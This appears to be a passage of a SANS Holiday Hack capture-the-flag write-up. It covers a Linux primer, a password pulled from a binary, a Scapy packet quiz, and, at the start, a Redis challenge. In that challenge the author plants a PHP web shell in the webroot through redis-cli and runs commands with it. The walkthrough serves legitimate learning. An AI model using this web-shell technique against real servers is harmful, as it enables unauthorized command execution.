a:link {color: #009; text-decoration: none; background-color: #fff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #cc
c;}
.center {text-align: center;}
.center table {margin: 1em auto; text-align: left;}
.center th {text-align: center !important;}
td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px
 5px;}
h1 {font-size: 150%;}
h2 {font-size: 125%;}
.p {text-align: left;}
.e {background-color: #ccf; width: 300px; font-weight: bold;}
.h {background-color: #99c; font-weight: bold;}
.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;
}
.v i {color: #999;}
img {float: right; border: 0;}
hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
</style>
<title>PHP 7.3.19-1~deb10u1 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NO
FOLLOW,NOARCHIVE" /></head>
<body><div class="center">
<table>
<tr class="h"><td>
<a href="http://www.php.net/">
```

Decided to go with the following process again but change what I do with a few steps.



```sh
player@33c984ced50f:~$ redis-cli -a R3disp@ss -h 127.0.0.1
Warning: Using a password with '-a' or '-u' option on the command line interface may n
ot be safe.
127.0.0.1:6379> config set dbfilename moretesting.php
OK
127.0.0.1:6379> set test "<?php system($_GET['command']) ?>"
OK
127.0.0.1:6379> save
OK
127.0.0.1:6379> exit
```

Verfied that this worked by issuing the ```id``` command from the ```moretesting.php``` script. Looks like the user this file is being executed as is the ```www-data``` user and group. So, it's isolated to that directory. Which is fine. All I need to be able to do is read the ```index.php``` file.

```sh
player@33c984ced50f:~$ curl --output - http://localhost/moretesting.php?command=id
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime�"w�_used-mem
 aof-preamble��� test!uid=33(www-data) gid=33(www-data) groups=33(www-data)
example1The site is in maintenance modeexample2#We think there's a bug in index.php�S�
```

Now it's time to see if the file is in the webroot of the server. Based on what I'm seeing. It is. I can see the ```index.php``` file. in the directory. I can also see the file that's executing the this command in there as well.

Little note. I was having issues initially with spaces considering this is a URL. So, I had to use the ```%20``` encoding in order for the command to work as expected. Could probably do something different. But, this worked the way it should.

```sh
player@33c984ced50f:~$ curl --output - http://localhost/moretesting.php?command=ls%20-la
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime�"w�_used-mem
 aof-preamble��� test!total 28
drwx------ 1 www-data www-data 4096 Jan  3 07:49 .
drwxr-xr-x 1 root     root     4096 Nov 24 18:52 ..
-rwx------ 1 www-data www-data  488 Jan  3 07:35 index.php
-rwx------ 1 www-data www-data  783 Nov 24 18:50 maintenance.php
-rw-r--r-- 1 root     root      225 Jan  3 07:49 moretesting.php
-rw-r--r-- 1 root     root      211 Jan  3 07:40 testing.php
example1The site is in maintenance modeexample2#We think there's a bug in index.php�S�
```

I am now confident that I can read the ```index.php``` file. I just issued the command ```cat%20index.php``` from my script and it worked. The challenge has been completed now that the ```index.php``` file has been read.

```sh
player@33c984ced50f:~$ curl --output - http://localhost/moretesting.php?command=cat%20index.php
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime�"w�_used-mem
 aof-preamble��� test!<?php
# We found the bug!!
#
#         \   /
#         .\-/.
#     /\ ()   ()
#       \/~---~\.-~^-.
# .-~^-./   |   \---.
#      {    |    }   \
#    .-~\   |   /~-.
#   /    \  A  /    \
#         \/ \/
# 
echo "Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on"?>
example1The site is in maintenance modeexample2#We think there's a bug in index.php�S�
```

Decided to open the ```maintenance.php``` file for my own viewing.

```sh
player@61e8c9c01a21:~$ curl --output - http://localhost/moretesting.php?command=cat%20maintenance.php
REDIS0009�      redis-ver5.0.3�
�edis-bits�@�ctime(�_used-mem
 aof-preamble��� test!<?php
$redis_password = "R3disp@ss";
if(!isset($_REQUEST['cmd']) || $_REQUEST['cmd'] == '') {
    die("\n\nERROR: 'cmd' argument required (use commas to separate commands); eg:\ncu
rl http://localhost/maintenance.php?cmd=help\ncurl http://localhost/maintenance.php?cm
d=mget,example1\n\n");
}
# Pull apart the command, escape it, and put it back together
$cmd = implode(' ', array_map('escapeshellarg', explode(',', $_REQUEST['cmd'])));
if(strpos($cmd, 'scan') !== false) {
  die("'scan' is not allowed");
}
if(strpos($cmd, 'requirepass') !== false) {
  die("'requirepass' is not allowed");
}
$cmd = "redis-cli --raw -a '$redis_password' $cmd";
echo "Running: " . str_replace($redis_password, '<password censored>', $cmd) . "\n\n";
$result = shell_exec($cmd);
echo $result;
?>
example2#We think there's a bug in index.phexample1The site is in maintenance mode��:H��(
```

#### F1 - Courtyard - Linux Primer

The North Pole 🍭 Lollipop Maker:
All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and 🍭's will appear in the green bar below. Run the command "hintme" to receive a hint.

###### Solution

The idea of this seems to be you run through the commands until you obtain all of the lollipops. When you're done completing the mini-challenges, you complete the callenge.

First starts out with this:

```txt
The North Pole 🍭 Lollipop Maker:
All the lollipops on this system have been stolen by munchkins. Capture munchkins by following instructions here and 🍭's will appear in the green bar below. Run the command "hintme" to receive a hint.
```

You type "yes" to start the challenge.

First mini-challenge is below:

```txt
Perform a directory listing of your home directory to find a munchkin and retrieve a lollipop!
```

It's asking to list the contents of the elf users home directory. This is done with the ```ls``` command. Issued the command and it lists the contents of the current directory. Challenge complete.

```sh
elf@6a3b5059dcd0:~$ ls
HELP  munchkin_19315479765589239  workshop
```

Below is the second mini-challenge:

```txt
Now find the munchkin inside the munchkin.
```

It's asking me to read the ```munchkin_19315479765589239``` file in the current directory. This is done using the ```cat``` command. Read the ```munchkin_19315479765589239``` file and the contents of the file are ```munchkin_24187022596776786```. Challenge complete.

```sh
elf@6a3b5059dcd0:~$ cat munchkin_19315479765589239 
munchkin_24187022596776786
```

Mini-challenge three is below:

```txt
Great, now remove the munchkin in your home directory.
```

It's requesting that I delete/remove the file ```munchkin_19315479765589239```. I do this using the ```rm``` command. After issuing the command, the file has been removed from the home directory. I confirm this using the ```ls``` command. Challenge completed.

```sh
elf@6a3b5059dcd0:~$ rm munchkin_19315479765589239 
elf@6a3b5059dcd0:~$ ls
HELP  workshop
```

Mini-challenge four:

```txt
Print the present working directory using a command.
```
```sh
elf@6a3b5059dcd0:~$ pwd
/home/elf
```

```txt
Good job but it looks like another munchkin hid itself in you home directory. Find the hidden munchkin!
```
```sh
elf@6a3b5059dcd0:~$ ls -la
total 56
drwxr-xr-x 1 elf  elf   4096 Jan  2 06:59 .
drwxr-xr-x 1 root root  4096 Dec 10 18:14 ..
-rw-r--r-- 1 elf  elf     31 Dec 10 18:18 .bash_history
-rw-r--r-- 1 elf  elf    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf   3105 Dec  5 00:00 .bashrc
-rw-r--r-- 1 elf  elf      0 Jan  2 06:59 .munchkin_5074624024543078
-rw-r--r-- 1 elf  elf    807 Apr  4  2018 .profile
-rw-r--r-- 1 elf  elf    168 Dec  5 00:00 HELP
drwxr-xr-x 1 elf  elf  20480 Dec 10 18:19 workshop
```

```txt
Excellent, now find the munchkin in your command history.
```
```sh
elf@6a3b5059dcd0:~$ history
    1  echo munchkin_9394554126440791
    2  ls
    3  cat munchkin_19315479765589239 
    4  rm munchkin_19315479765589239 
    5  ls
    6  pwd
    7  ls -la
    8  history
```

```txt
Find the munchkin in your environment variables.
```
```sh
lf@04e8b3cb3445:~$ printenv | grep -i munchkin
z_MUNCHKIN=munchkin_20249649541603754
SESSNAME=Munchkin Wrangler
```

```txt
Next, head into the workshop.
```
```sh
elf@6a3b5059dcd0:~$ ls
HELP  workshop
elf@6a3b5059dcd0:~$ cd workshop/
elf@6a3b5059dcd0:~/workshop$
```

```txt
A munchkin is hiding in one of the workshop toolboxes. Use "grep" while ignoring case to find which toolbox the munchkin is in.
```
```sh
elf@6a3b5059dcd0:~/workshop$ grep -i "munchkin" *.txt
toolbox_191.txt:mUnChKin.4056180441832623
```

```txt
A munchkin is blocking the lollipop_engine from starting. Run the lollipop_engine binary to retrieve this munchkin.
```
```sh
elf@6a3b5059dcd0:~/workshop$ ls | grep -i lollipop
lollipop_engine
elf@6a3b5059dcd0:~/workshop$ ls -la | grep -i lollipop
-r--r--r-- 1 elf elf 5692640 Dec 10 18:19 lollipop_engine
elf@6a3b5059dcd0:~/workshop$ file lollipop_engine
lollipop_engine: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interp
reter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3507aa01d32c34dc8e8c6462b764a
db90a82768d, stripped
elf@6a3b5059dcd0:~/workshop$ chmod ug+x lollipop_engine 
elf@6a3b5059dcd0:~/workshop$ ls -la | grep -i lollipop
-r-xr-xr-- 1 elf elf 5692640 Dec 10 18:19 lollipop_engine
elf@6a3b5059dcd0:~/workshop$ ./lollipop_engine 
munchkin.898906189498077
```

```txt
Munchkins have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.
```
```sh
elf@6a3b5059dcd0:~/workshop$ cd electrical/
elf@6a3b5059dcd0:~/workshop/electrical$ ls
blown_fuse0
elf@6a3b5059dcd0:~/workshop/electrical$ mv blown_fuse0 fuse0
```

```txt
Now, make a symbolic link (symlink) named fuse1 that points to fuse0
```
```sh
elf@6a3b5059dcd0:~/workshop/electrical$ ln -s fuse0 fuse1
elf@6a3b5059dcd0:~/workshop/electrical$ ls -la
total 20
drwxr-xr-x 1 elf elf 4096 Jan  2 07:18 .
drwxr-xr-x 1 elf elf 4096 Dec 10 18:19 ..
-rw-r--r-- 1 elf elf  200 Dec 10 18:19 fuse0
lrwxrwxrwx 1 elf elf    5 Jan  2 07:18 fuse1 -> fuse0
```

```txt
Make a copy of fuse1 named fuse2.
```
```sh
elf@6a3b5059dcd0:~/workshop/electrical$ cp fuse1 fuse2
elf@6a3b5059dcd0:~/workshop/electrical$ ls -la
total 24
drwxr-xr-x 1 elf elf 4096 Jan  2 07:18 .
drwxr-xr-x 1 elf elf 4096 Dec 10 18:19 ..
-rw-r--r-- 1 elf elf  200 Dec 10 18:19 fuse0
lrwxrwxrwx 1 elf elf    5 Jan  2 07:18 fuse1 -> fuse0
-rw-r--r-- 1 elf elf  200 Jan  2 07:18 fuse2
```

```txt
We need to make sure munchkins don't come back. Add the characters "MUNCHKIN_REPELLENT" into the file fuse2.
```
```sh
elf@04e8b3cb3445:~/workshop/electrical$ echo "MUNCHKIN_REPELLENT" > fuse2
elf@04e8b3cb3445:~/workshop/electrical$ cat fuse2
MUNCHKIN_REPELLENT
```

```txt
Find the munchkin somewhere in /opt/munchkin_den.
```
```sh
elf@04e8b3cb3445:~/workshop/electrical$ cd /opt/munchkin_den/
elf@04e8b3cb3445:/opt/munchkin_den$ ls -la
total 136
drwxr-xr-x 1 root root  4096 Dec 10 18:20 .
drwxr-xr-x 1 root root  4096 Dec 10 18:20 ..
-rw-r--r-- 1 root root   403 Dec 10 18:20 .asf.yaml
drwxr-xr-x 8 root root  4096 Dec 10 18:20 .git
-rw-r--r-- 1 root root   481 Dec 10 18:20 .gitignore
drwxr-xr-x 3 root root  4096 Dec 10 18:20 .mvn
-rw-r--r-- 1 root root   922 Dec 10 18:20 .travis.yml
-rw-r--r-- 1 root root  6320 Dec 10 18:20 Jenkinsfile
-rw-r--r-- 1 root root  1727 Dec 10 18:20 SECURITY.md
drwxr-xr-x 1 root root  4096 Dec 10 18:20 apps
drwxr-xr-x 3 root root  4096 Dec 10 18:20 assembly
drwxr-xr-x 2 root root  4096 Dec 10 18:20 bom
drwxr-xr-x 4 root root  4096 Dec 10 18:20 bundles
drwxr-xr-x 3 root root  4096 Dec 10 18:20 core
-rwxr-xr-x 1 root root 10069 Dec 10 18:20 mvnw
-rw-r--r-- 1 root root  6607 Dec 10 18:20 mvnw.cmd
drwxr-xr-x 1 root root  4096 Dec 10 18:20 plugins
-rw-r--r-- 1 root root 48541 Dec 10 18:20 pom.xml
drwxr-xr-x 5 root root  4096 Dec 10 18:20 src
elf@04e8b3cb3445:/opt/munchkin_den$ find . -type f | grep -i munchkin
./apps/showcase/src/main/resources/mUnChKin.6253159819943018
```

```txt
Find the file somewhere in /opt/munchkin_den that is owned by the user munchkin.
```
```sh
elf@04e8b3cb3445:/opt/munchkin_den$ find . -type f -user munchkin
./apps/showcase/src/main/resources/template/ajaxErrorContainers/niKhCnUm_9528909612014411
```

```txt
Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/munchkin_den.
```
```sh
elf@04e8b3cb3445:/opt/munchkin_den$ find . -type f -group munchkin -size -110k
./apps/showcase/src/main/resources/template/ajaxErrorContainers/niKhCnUm_9528909612014411
```

```txt
Find the file created by munchkins that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/munchkin_den.
```
```sh
elf@04e8b3cb3445:/opt/munchkin_den$ find . -type f -size +108k -a -size -110k
./plugins/portlet-mocks/src/test/java/org/apache/m_u_n_c_h_k_i_n_2579728047101724
```

```txt
List running processes to find another munchkin.
```
```sh
elf@04e8b3cb3445:/opt/munchkin_den$ ps aux | grep -i munchkin
elf      35190  0.5  0.0  84316 26228 pts/2    S+   07:41   0:00 /usr/bin/python3 /14516_munchkin
elf      36625  0.0  0.0  13240  1120 pts/3    S+   07:41   0:00 grep --color=auto -i munchkin
```

```txt
The 14516_munchkin process is listening on a tcp port. Use a command to have the only listening port display to the screen.
```
```sh
elf@04e8b3cb3445:/opt/munchkin_den$ netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:54321           0.0.0.0:*               LISTEN     
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     870410949 /tmp/tmux-1050/default
unix  3      [ ]         STREAM     CONNECTED     870411039 /tmp/tmux-1050/default
unix  3      [ ]         STREAM     CONNECTED     870341236 
```

```txt
The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last munchkin.
```
```sh
elf@04e8b3cb3445:/opt/munchkin_den$ curl http://localhost:54321/
munchkin.73180338045875
```

```txt
Your final task is to stop the 14516_munchkin process to collect the remaining lollipops.
```
```sh
elf@04e8b3cb3445:/opt/munchkin_den$ ps aux | grep munchkin
elf      35190  0.1  0.0 160448 26824 pts/2    S+   07:41   0:00 /usr/bin/python3 /14516_munchkin
elf      43489  0.0  0.0  13240  1080 pts/3    S+   07:46   0:00 grep --color=auto munchkin
elf@04e8b3cb3445:/opt/munchkin_den$ kill 35190
elf@04e8b3cb3445:/opt/munchkin_den$ ps aux | grep munchkin
elf      44548  0.0  0.0  13240  1140 pts/3    S+   07:46   0:00 grep --color=auto munchkin
```

#### F2 - Talks Lobby - Speaker UNPrep

Help us get into the Speaker Unpreparedness Room!

The door is controlled by ./door, but it needs a password! If you can figureout the password, it'll open the door right up!

Oh, and if you have extra time, maybe you can turn on the lights with ./lightsactivate the vending machines with ./vending-machines? Those are a little trickier, they have configuration files, but it'd help us a lot!

(You can do one now and come back to do the others later if you want)

We copied edit-able versions of everything into the ./lab/ folder, in case youwant to try EDITING or REMOVING the configuration files to see how the binariesreact.

Note: These don't require low-level reverse engineering, so you can put away IDA and Ghidra (unless you WANT to use them!)

#### Solution

```sh
elf@345c0dd109b7 ~ $ ls -la
total 852
drwxr-xr-x 1 root root   4096 Dec  3 20:43 .
drwxr-xr-x 1 root root   4096 Dec  3 20:41 ..
-rw-r--r-- 1 elf  elf     220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 root root    102 Oct  1 17:37 .bashrc
drwxr-xr-x 1 elf  elf    4096 Dec  3 20:43 .local
-rw-r--r-- 1 elf  elf     807 Apr 18  2019 .profile
-rwxr-xr-x 1 root root 231728 Dec  1 19:19 door
drwxr-xr-x 1 elf  elf    4096 Dec  3 20:43 lab
-rwxr-xr-x 1 root root 276784 Dec  1 19:19 lights
-rw-r--r-- 1 root root     92 Oct  1 17:37 lights.conf
-rwxr-xr-x 1 root root 321840 Dec  1 19:19 vending-machines
-rw-r--r-- 1 root root     59 Oct  1 17:37 vending-machines.json
```

```sh
elf@345c0dd109b7 ~ $ strings door | grep pass
/home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the 
password is probably stored right in the binary. There's gotta be a
Be sure to finish the challenge in prod: And don't forget, the password is "Op3nTheD00r"
Beep boop invalid password
```

```sh
elf@345c0dd109b7 ~ $ ./door 
You look at the screen. It wants a password. You roll your eyes - the 
password is probably stored right in the binary. There's gotta be a
tool for this...
What do you enter? > Op3nTheD00r
Checking......
Door opened!
```

#### FRoot - Netwars Room - Scapy Prepper

```txt
╔════════════════════════════════════════════════════════════════╗
║  ___ ___ ___ ___ ___ _  _ _____   ___  _   ___ _  _____ _____  ║
║ | _ \ _ \ __/ __| __| \| |_   _| | _ \/_\ / __| |/ / __|_   _| ║
║ |  _/   / _|\__ \ _|| .` | | |   |  _/ _ \ (__| ' <| _|  | |   ║
║ |_| |_|_\___|___/___|_|\_| |_|   |_|/_/ \_\___|_|\_\___| |_|   ║
║                ___                                             ║
║               | _ \_ _ ___ _ __ _ __  ___ _ _                  ║
║               |  _/ '_/ -_) '_ \ '_ \/ -_) '_|                 ║
║               |_| |_| \___| .__/ .__/\___|_|                   ║
║                           |_|  |_|                             ║
║                (Packets prepared with scapy)                   ║
╚════════════════════════════════════════════════════════════════╝
```

##### Solution

```sh
╔════════════════════════════════════════════════════════════════╗
║ HELP MENU:                                                     ║
╠════════════════════════════════════════════════════════════════╣
║ 'help()' prints the present packet scapy help.                 ║
║ 'help_menu()' prints the present packet scapy help.            ║
║ 'task.get()' prints the current task to be solved.             ║
║ 'task.task()' prints the current task to be solved.            ║
║ 'task.help()' prints help on how to complete your task         ║
║ 'task.submit(answer)' submit an answer to the current task     ║
║ 'task.answered()' print through all successfully answered.     ║
╚════════════════════════════════════════════════════════════════╝
>>> task.get()
Welcome to the "Present Packet Prepper" interface! The North Pole could use your help preparing present packets for shipment.
Start by running the task.submit() function passing in a string argument of 'start'.
Type task.help() for help on this question.
```
```sh
>>> task.submit('start')
Correct! adding a () to a function or class will execute it. Ex - FunctionExecuted(
)
```

```txt
Submit the class object of the scapy module that sends packets at layer 3 of the OS
I model.
```
```sh
>>> task.submit(send)
Correct! The "send" scapy class will send a crafted scapy packet out of a network i
nterface.
```

```txt
Submit the class object of the scapy module that sniffs network packets and returns
 those packets in a list.
```
```sh
>>> task.submit(sniff)
Correct! the "sniff" scapy class will sniff network traffic and return these packet
s in a list.
```

```txt
Submit the NUMBER only from the choices below that would successfully send a TCP pa
cket and then return the first sniffed response packet to be stored in a variable n
amed "pkt":
1. pkt = sr1(IP(dst="127.0.0.1")/TCP(dport=20))
2. pkt = sniff(IP(dst="127.0.0.1")/TCP(dport=20))
3. pkt = sendp(IP(dst="127.0.0.1")/TCP(dport=20))
```
```sh
>>> task.submit(1)
Correct! sr1 will send a packet, then immediately sniff for a response packet.
```

```txt
Submit the class object of the scapy module that can read pcap or pcapng files and 
return a list of packets.
```
```sh
>>> task.submit(rdpcap)
Correct! the "rdpcap" scapy class can read pcap files.
```

```txt
The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only fro
m the choices below that correctly prints a summary of UDP_PACKETS:
1. UDP_PACKETS.print()
2. UDP_PACKETS.show()
3. UDP_PACKETS.list()
```
```sh
>>> UDP_PACKETS.show()
0000 Ether / IP / UDP / DNS Qry "b'www.elves.rule.'" 
0001 Ether / IP / UDP / DNS Ans "10.21.23.12" 
>>> task.submit(2)
Correct! .show() can be used on lists of packets AND on an individual packet.

```txt
Submit only the first packet found in UDP_PACKETS.
```
```sh
>>> UDP_PACKETS.show()
0000 Ether / IP / UDP / DNS Qry "b'www.elves.rule.'" 
0001 Ether / IP / UDP / DNS Ans "10.21.23.12" 
>>> task.submit(UDP_PACKETS[0])
Correct! Scapy packet lists work just like regular python lists so packets can be a
ccessed by their position in the list starting at offset 0.
```

```txt
Submit only the entire TCP layer of the second packet in TCP_PACKETS.
```
```sh
>>> TCP_PACKETS[1]
<Ether  dst=00:16:ce:6e:8b:24 src=00:15:f2:40:76:ef type=IPv4 |<IP  version=4 ihl=5
 tos=0x0 len=48 id=10592 flags= frag=0 ttl=128 proto=tcp chksum=0x8ee4 src=192.168.
0.193 dst=192.168.0.114 |<TCP  sport=ftp dport=1137 seq=3334930753 ack=3753095935 d
ataofs=7 reserved=0 flags=SA window=16384 chksum=0x6151 urgptr=0 options=[('MSS', 1
452), ('NOP', None), ('NOP', None), ('SAckOK', b'')] |>>>
>>> TCP_PACKETS[1][2]
<TCP  sport=ftp dport=1137 seq=3334930753 ack=3753095935 dataofs=7 reserved=0 flags
=SA window=16384 chksum=0x6151 urgptr=0 options=[('MSS', 1452), ('NOP', None), ('NO
P', None), ('SAckOK', b'')] |>
>>> task.submit(TCP_PACKETS[1][2])
Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR
, Raw, etc... can be accessed this way. Ex - pkt[IP][TCP]
```

```txt
Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 
and then submit this modified packet
```
```sh
>>> UDP_PACKETS[0][IP]
<IP  version=4 ihl=5 tos=0x0 len=60 id=0 flags=DF frag=0 ttl=64 proto=udp chksum=0x
6543 src=192.168.170.8 dst=192.168.170.20 |<UDP  sport=32795 dport=domain len=40 ch
ksum=0xaf61 |<DNS  id=30144 qr=0 opcode=QUERY aa=0 tc=0 rd=1 ra=0 z=0 ad=0 cd=0 rco
de=ok qdcount=1 ancount=0 nscount=0 arcount=0 qd=<DNSQR  qname='www.elves.rule.' qt
ype=A qclass=IN |> an=None ns=None ar=None |>>>
>>> UDP_PACKETS[0][IP].src
'192.168.170.8'
>>> UDP_PACKETS[0][IP].src = "127.0.0.1"
>>> UDP_PACKETS[0][IP]
<IP  version=4 ihl=5 tos=0x0 len=60 id=0 flags=DF frag=0 ttl=64 proto=udp chksum=0x
6543 src=127.0.0.1 dst=192.168.170.20 |<UDP  sport=32795 dport=domain len=40 chksum
=0xaf61 |<DNS  id=30144 qr=0 opcode=QUERY aa=0 tc=0 rd=1 ra=0 z=0 ad=0 cd=0 rcode=o
k qdcount=1 ancount=0 nscount=0 arcount=0 qd=<DNSQR  qname='www.elves.rule.' qtype=
A qclass=IN |> an=None ns=None ar=None |>>>
>>> task.submit(UDP_PACKETS[0][IP])
Correct! You can change ALL scapy packet attributes using this method.
```

```txt
Submit the password "task.submit('elf_password')" of the user alabaster as found in the packet list TCP_PACKETS.
```
```sh
>>> TCP_PACKETS.show()
0000 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp S
0001 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 SA
0002 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp A
0003 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
0004 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw
0005 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
0006 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw
0007 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
>>> TCP_PACKETS[0]
<Ether  dst=00:15:f2:40:76:ef src=00:16:ce:6e:8b:24 type=IPv4 |<IP  version=4 ihl=5
 tos=0x0 len=48 id=42979 flags=DF frag=0 ttl=128 proto=tcp chksum=0xd060 src=192.16
8.0.114 dst=192.168.0.193 |<TCP  sport=1137 dport=ftp seq=3753095934 ack=0 dataofs=
7 reserved=0 flags=S window=16384 chksum=0x2963 urgptr=0 options=[('MSS', 1460), ('
NOP', None), ('NOP', None), ('SAckOK', b'')] |>>>
>>> TCP_PACKETS[1]
<Ether  dst=00:16:ce:6e:8b:24 src=00:15:f2:40:76:ef type=IPv4 |<IP  version=4 ihl=5
 tos=0x0 len=48 id=10592 flags= frag=0 ttl=128 proto=tcp chksum=0x8ee4 src=192.168.
0.193 dst=192.168.0.114 |<TCP  sport=ftp dport=1137 seq=3334930753 ack=3753095935 d
ataofs=7 reserved=0 flags=SA window=16384 chksum=0x6151 urgptr=0 options=[('MSS', 1
452), ('NOP', None), ('NOP', None), ('SAckOK', b'')] |>>>
>>> TCP_PACKETS[2]
<Ether  dst=00:15:f2:40:76:ef src=00:16:ce:6e:8b:24 type=IPv4 |<IP  version=4 ihl=5
 tos=0x0 len=40 id=42980 flags=DF frag=0 ttl=128 proto=tcp chksum=0xd067 src=192.16
8.0.114 dst=192.168.0.193 |<TCP  sport=1137 dport=ftp seq=3753095935 ack=3334930754
 dataofs=5 reserved=0 flags=A window=17424 chksum=0x89fd urgptr=0 |>>>
>>> TCP_PACKETS[3]
<Ether  dst=00:16:ce:6e:8b:24 src=00:15:f2:40:76:ef type=IPv4 |<IP  version=4 ihl=5
 tos=0x0 len=70 id=10593 flags=DF frag=0 ttl=128 proto=tcp chksum=0x4ecd src=192.16
8.0.193 dst=192.168.0.114 |<TCP  sport=ftp dport=1137 seq=3334930754 ack=3753095935
 dataofs=5 reserved=0 flags=PA window=65535 chksum=0xd97d urgptr=0 |<Raw  load='220
 North Pole FTP Server\r\n' |>>>>
 >>> TCP_PACKETS[4]
<Ether  dst=00:15:f2:40:76:ef src=00:16:ce:6e:8b:24 type=IPv4 |<IP  version=4 ihl=5
 tos=0x0 len=55 id=42981 flags=DF frag=0 ttl=128 proto=tcp chksum=0xd057 src=192.16
8.0.114 dst=192.168.0.193 |<TCP  sport=1137 dport=ftp seq=3753095935 ack=3334930784
 dataofs=5 reserved=0 flags=PA window=17394 chksum=0xa98 urgptr=0 |<Raw  load='USER
 alabaster\r' |>>>>
>>> TCP_PACKETS[5]
<Ether  dst=00:16:ce:6e:8b:24 src=00:15:f2:40:76:ef type=IPv4 |<IP  version=4 ihl=5
 tos=0x0 len=77 id=10594 flags=DF frag=0 ttl=128 proto=tcp chksum=0x4ec5 src=192.16
8.0.193 dst=192.168.0.114 |<TCP  sport=ftp dport=1137 seq=3334930784 ack=3753095950
 dataofs=5 reserved=0 flags=PA window=65520 chksum=0x3d9c urgptr=0 |<Raw  load='331
 Password required for alabaster.\r' |>>>>
>>> TCP_PACKETS[6]
<Ether  dst=00:15:f2:40:76:ef src=00:16:ce:6e:8b:24 type=IPv4 |<IP  version=4 ihl=5
 tos=0x0 len=51 id=42982 flags=DF frag=0 ttl=128 proto=tcp chksum=0xd05a src=192.16
8.0.114 dst=192.168.0.193 |<TCP  sport=1137 dport=ftp seq=3753095950 ack=3334930821
 dataofs=5 reserved=0 flags=PA window=17357 chksum=0xe96b urgptr=0 |<Raw  load='PAS
S echo\r\n' |>>>>
>>> TCP_PACKETS[7]
<Ether  dst=00:16:ce:6e:8b:24 src=00:15:f2:40:76:ef type=IPv4 |<IP  version=4 ihl=5
 tos=0x0 len=70 id=10595 flags=DF frag=0 ttl=128 proto=tcp chksum=0x4ecb src=192.16
8.0.193 dst=192.168.0.114 |<TCP  sport=ftp dport=1137 seq=3334930821 ack=3753095961
 dataofs=5 reserved=0 flags=PA window=65509 chksum=0xd3 urgptr=0 |<Raw  load='230 U
ser alabaster logged in.\r' |>>>>
>> task.submit('echo')
Correct! Here is some really nice list comprehension that will grab all the raw pay
loads from tcp packets:
[pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]
```

```txt
The ICMP_PACKETS variable contains a packet list of several icmp echo-request and i
cmp echo-reply packets. Submit only the ICMP chksum value from the second packet in
 the ICMP_PACKETS list.
```
```sh
>>> ICMP_PACKETS[1][ICMP].chksum
19524
>>> task.submit(ICMP_PACKETS[1][ICMP].chksum)
Correct! You can access the ICMP chksum value from the second packet using ICMP_PAC
KETS[1][ICMP].chksum .
```

```txt
Submit the number of the choice below that would correctly create a ICMP echo reque
st packet with a destination IP of 127.0.0.1 stored in the variable named "pkt"
1. pkt = Ether(src='127.0.0.1')/ICMP(type="echo-request")
2. pkt = IP(src='127.0.0.1')/ICMP(type="echo-reply")
3. pkt = IP(dst='127.0.0.1')/ICMP(type="echo-request")
```
```sh
>>> task.submit(3)
Correct! Once you assign the packet to a variable named "pkt" you can then use that
 variable to send or manipulate your created packet.
```

```txt
Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.12
7.127. (all other packet attributes can be unspecified)
```
```sh
>>> pkt = IP(dst='127.127.127.127')/UDP(dport=5000)
>>> pkt
<IP  frag=0 proto=udp dst=127.127.127.127 |<UDP  dport=5000 |>>
>>> task.submit(pkt)
Correct! Your UDP packet creation should look something like this:
pkt = IP(dst="127.127.127.127")/UDP(dport=5000)
task.submit(pkt)
```

```txt
Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and 
is a DNS query with a qname of "elveslove.santa". (all other packet attributes can 
be unspecified)
```
```sh
>>> pkt = IP(dst='127.2.3.4')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="elveslove.santa"))
>>> pkt
<IP  frag=0 proto=udp dst=127.2.3.4 |<UDP  sport=domain dport=domain |<DNS  rd=1 qd
=<DNSQR  qname='elveslove.santa' |> |>>>
>>> task.submit(pkt)
Correct! Your UDP packet creation should look something like this:
pkt = IP(dst="127.2.3.4")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="elveslove.santa"))
task.submit(pkt)
```

```txt
The variable ARP_PACKETS contains an ARP request and response packets. The ARP resp
onse (the second packet) has 3 incorrect fields in the ARP layer. Correct the secon
d packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKET
S) for inspection.
```
```sh
>>> ARP_PACKETS[0][ARP]
